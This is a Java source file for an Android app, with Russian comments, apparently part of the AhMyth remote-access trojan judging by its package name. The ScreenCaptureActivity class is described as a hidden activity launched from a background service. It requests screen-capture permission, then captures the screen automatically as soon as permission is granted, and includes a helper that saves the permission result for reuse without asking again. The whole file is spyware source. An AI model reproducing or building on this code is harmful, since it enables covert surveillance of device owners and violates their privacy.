package ahmyth.mine.king.ahmyth;

import android.app.Activity;
import android.content.Intent;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Bundle;
import android.util.Log;
import ahmyth.mine.king.ahmyth.AppLogger;
import ahmyth.mine.king.ahmyth.Constants;

/**
 * ScreenCaptureActivity - скрытая Activity для запроса разрешения MediaProjection
 * Запускается из сервиса для получения разрешения на захват экрана
 */
public class ScreenCaptureActivity extends Activity {

    private static final String TAG = "ScreenCaptureActivity";
    private static final int REQUEST_MEDIA_PROJECTION = 1000;

    private MediaProjectionManager projectionManager;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        AppLogger.d(TAG, "=== ScreenCaptureActivity.onCreate() ===");
        
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) {
            AppLogger.e(TAG, "ERROR: MediaProjection requires Android 5.0+");
            finish();
            return;
        }

        projectionManager = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
        if (projectionManager == null) {
            AppLogger.e(TAG, "ERROR: MediaProjectionManager is NULL!");
            finish();
            return;
        }
        
        AppLogger.d(TAG, "Requesting MediaProjection permission...");
        // Сразу запрашиваем разрешение
        requestMediaProjection();
    }

    /**
     * Запрос разрешения MediaProjection
     */
    private void requestMediaProjection() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            Intent captureIntent = projectionManager.createScreenCaptureIntent();
            startActivityForResult(captureIntent, REQUEST_MEDIA_PROJECTION);
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        AppLogger.d(TAG, "=== onActivityResult ===");
        AppLogger.d(TAG, "requestCode: " + requestCode + ", resultCode: " + resultCode);

        if (requestCode == REQUEST_MEDIA_PROJECTION) {
            if (resultCode == RESULT_OK && data != null) {
                AppLogger.d(TAG, "MediaProjection permission GRANTED");
                // Получаем MediaProjection
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                    MediaProjection mediaProjection = projectionManager.getMediaProjection(resultCode, data);
                    if (mediaProjection == null) {
                        AppLogger.e(TAG, "ERROR: Failed to get MediaProjection instance!");
                    } else {
                        AppLogger.d(TAG, "MediaProjection instance created successfully");
                        // Сохраняем в ScreenCaptureManager
                        final ScreenCaptureManager screenCaptureManager = ScreenCaptureManager.getInstance(this);
                        screenCaptureManager.setMediaProjection(mediaProjection);
                        AppLogger.d(TAG, "MediaProjection set in ScreenCaptureManager");
                        
                        
                        // Автоматически выполняем захват после получения разрешения
                        new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(new Runnable() {
                            @Override
                            public void run() {
                                AppLogger.d(TAG, "Auto-capturing screen after permission grant");
                                screenCaptureManager.captureScreen();
                            }
                        }, Constants.MEDIA_PROJECTION_DELAY_MS);
                    }
                }
            } else {
                AppLogger.e(TAG, "ERROR: MediaProjection permission DENIED (resultCode: " + resultCode + ")");
            }
            
            // Закрываем Activity
            finish();
        }
    }

    /**
     * Сохранение результата MediaProjection для повторного использования
     * Это позволяет использовать MediaProjection без повторного запроса разрешения
     */
    private void saveMediaProjectionResult(int resultCode, Intent data) {
        // Сохраняем в SharedPreferences для последующего использования
        // В реальном приложении это должно быть зашифровано
        getSharedPreferences("ScreenCapture", MODE_PRIVATE)
                .edit()
                .putInt("resultCode", resultCode)
                .putString("data", data != null ? data.toUri(0) : null)
                .apply();
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
    }
}
